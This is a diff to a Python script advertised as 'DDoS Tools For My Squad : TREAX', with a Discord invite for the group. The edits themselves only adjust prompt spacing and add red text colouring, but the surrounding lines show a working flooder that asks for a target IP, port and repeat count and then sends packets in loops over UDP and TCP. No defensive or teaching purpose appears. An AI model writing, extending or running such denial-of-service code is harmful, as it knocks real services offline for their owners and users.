@@ -21,7 +21,7 @@ print("DDoS Tools For My Squad : TREAX ")
 print("Join to my squad discord link ")
 print("TREAX SQUAD : https://discord.gg/ScPy4SMc ") 
     
-ip = str(input("  IP Target :"))
+ip = str(input(" IP Target :"))
 port = int(input(" PORT Target :"))
 choice = str(input(" Are You Seriously? (y/n) :"))
 times = int(input(" Times :"))
@@ -35,7 +35,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" TREAX COMMUNITY!!! ")
+			print(i +"\033[91m TREAX COMMUNITY!!! ")
 		except:
 			print("[-] Server Has Been Maintenance")
 
@@ -49,7 +49,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" TREAX COMMUNITY!!! ")
+			print(i +"\033[91m TREAX COMMUNITY!!! ")
 		except:
 			s.close()
 			print("[-] Server Has Been Maintenance")
